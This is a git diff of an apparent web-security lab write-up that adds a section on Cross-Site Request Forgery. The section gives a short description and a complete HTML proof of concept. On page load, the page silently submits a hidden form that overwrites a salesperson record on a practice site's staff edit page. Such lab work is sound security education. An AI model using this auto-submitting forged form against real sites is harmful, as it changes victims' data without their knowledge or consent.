@@ -65,11 +65,35 @@ Through changing the _id_ parameter on the red site's "Find a Saleperson" tab, i
 
 <img src="insecure_direct_object_reference.gif">
 
-### Vulnerability #2: __________________
+### Vulnerability #2: Cross-Site Request Forgery
 
-Description:
+Description: Cross-Site Request Forgery is an attack in which a user is tricked into performing actions on another site by inadvertently clicking on a link or submitting a form. It is not a genuine user request.
 
-<img src="red-vuln2.gif">
+
+
+<img src="cross_site_request_forgery.gif">
+Script Used:
+'''html
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>FAKE Form</title>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+</head>
+
+<body onload="document.getElementById('f').submit();">
+  <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=7" method="post" id="f" style="display: none;" target="hidden_results">
+    <input type="text" name="first_name" value="GETHACKEDBOIII" />
+    <input type="text" name="last_name" value="KARMA" />
+    <input type="text" name="phone" value="911" />
+    <input type="text" name="email" value="noemailforyou@gmail.com" />
+  </form>
+  <iframe name="hidden_results" style="display: none;"></iframe>
+</body>
+
+</html>
+'''
 
 
 ## Notes
